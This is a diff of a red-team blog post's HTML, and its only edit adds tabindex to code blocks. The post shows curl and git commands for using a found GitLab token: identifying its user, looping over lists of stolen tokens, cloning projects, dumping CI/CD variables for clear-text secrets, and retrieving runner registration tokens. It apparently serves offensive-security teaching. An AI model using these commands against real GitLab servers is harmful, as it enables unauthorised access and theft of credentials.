@@ -148,21 +148,21 @@
 <p>Let&rsquo;s assume one has access to a Gitlab Token as a precursor. Let&rsquo;s walk through some interesting commands and script snippets to leverage to find out more.</p>
 <h2 id="found-a-gitlab-token---what-to-do">Found a Gitlab Token - what to do?</h2>
 <p>First, let&rsquo;s define a couple environment variables that will be used recurringly.</p>
-<pre><code>TOKEN=$(cat .token)
+<pre tabindex="0"><code>TOKEN=$(cat .token)
 GITLAB_HOST=[yourserver]
 GITLAB_API=&quot;https://$GITLAB_HOST/api/v4&quot;
 </code></pre><p>That&rsquo;s it, and these variables are pretty self-explanatory.</p>
 <h3 id="who-i-am">Who I Am?</h3>
 <p>The first obvious command once a token has been found is to check what user it belongs to.</p>
-<pre><code>curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; &quot;$GITLAB_API/user&quot; | jq .username
+<pre tabindex="0"><code>curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; &quot;$GITLAB_API/user&quot; | jq .username
 </code></pre><p>Note: One can also provide a dedicated HTTP header <code>PRIVATE-TOKEN</code> to the Gitlab instance. More useful information is documented by <a href="https://docs.gitlab.com/ee/security/token_overview.html">Gitlab here</a>.</p>
 <h2 id="retrieving-projects">Retrieving Projects</h2>
 <p>With a valid token one can enumerate projects:</p>
-<pre><code>curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; \
+<pre tabindex="0"><code>curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; \
      &quot;$GITLAB_API/projects/owned=true&amp;simple=true&amp;per_page=100&quot; | jq 
 </code></pre><p>An adversary might look for projects they &ldquo;own&rdquo;, so they can do check-ins, like for instance check-in a <code>.gitlab-ci.yml</code> file to modify/create a CI/CD pipeline.</p>
 <p>Assuming you have a list of tokens (we are red teamers after all), one can also loop over and call the API with something like this:</p>
-<pre><code>TOKENS=$(cat .tokens)
+<pre tabindex="0"><code>TOKENS=$(cat .tokens)
 for T in $TOKENS
 do
     curl --silent --header &quot;Authorization: Bearer $T&quot; \
@@ -172,13 +172,13 @@ done
 <h2 id="cloning-projects">Cloning Projects</h2>
 <p>Source Code often contains clear text credentials. To search through the code for secrets and other information Gitlab provides the capability to leverage the API token using <code>git</code> to pull projects from the server.</p>
 <p>Here is how this looks like in action:</p>
-<pre><code>PROJ_PATH=MyProject/KoiPhish/KoiPhish.git
+<pre tabindex="0"><code>PROJ_PATH=MyProject/KoiPhish/KoiPhish.git
 git -C ./src/ clone &quot;https://gitlab-ci-token:$TOKEN@$GITLAB_HOST/$PROJ_PATH
 </code></pre><p>Notice the username <code>gitlab-ci-token</code> in the URL. There are also a couple of other ways to do this. Again, refer to the <a href="https://docs.gitlab.com/ee/security/token_overview.html">Gitlab documenation</a> for further details.</p>
 <h2 id="enumerating-gitlab-cicd-variables">Enumerating Gitlab CI/CD Variables</h2>
 <p>Gitlab CI/CD variables are great! Why? Because the often contain clear text secrets as well!</p>
 <p>A command to enumerate them is:</p>
-<pre><code>PROJECT_ID=123
+<pre tabindex="0"><code>PROJECT_ID=123
 curl --silent \
      --header &quot;Authorization: Bearer $TOKEN&quot; \ 
      &quot;$GITLAB_API/projects/$PROJECT_ID/variables&quot; | jq 
@@ -192,7 +192,7 @@ curl --silent \
 </ul>
 <h2 id="runners-token">Runners Token</h2>
 <p>Inside the projects details I also discovered a <code>runners_token</code>.</p>
-<pre><code>PROJECT_ID=123
+<pre tabindex="0"><code>PROJECT_ID=123
 curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; \
      &quot;$GITLAB_API/projects/$PROJECT_ID&quot; | jq .runners_token | jq 
 </code></pre><p>From the Gitlab documentation:</p>
@@ -201,7 +201,7 @@ curl --silent --header &quot;Authorization: Bearer $TOKEN&quot; \
 </blockquote>
 <p>Initially I assumed that token is the authentication token, but it&rsquo;s actually the <strong>Registration Token</strong>.</p>
 <p>It took me a while to realize that. Initially I had tried to verify the token as an auth token using:</p>
-<pre><code>curl --request POST &quot;$GITLAB_API/runners/verify&quot; --form &quot;token=$RUNNER_TOKEN&quot;
+<pre tabindex="0"><code>curl --request POST &quot;$GITLAB_API/runners/verify&quot; --form &quot;token=$RUNNER_TOKEN&quot;
 </code></pre><p>But that didn&rsquo;t work. Then I realized that the <code>runners_token</code> is the shown in the Projects CI/CD pipelines page as the Registration Token. So, gaining access to this implies that you can register your own runners!</p>
 <p>More information on how Runners registration works can be found <a href="https://docs.gitlab.com/runner/register/">here</a>.</p>
 <p>Interestingly, just two days ago there was a <a href="https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#runner-registration-token-disclosure-through-quick-actions">critical CVE issued</a> by Gitlab regarding Runner Registration Tokens.</p>
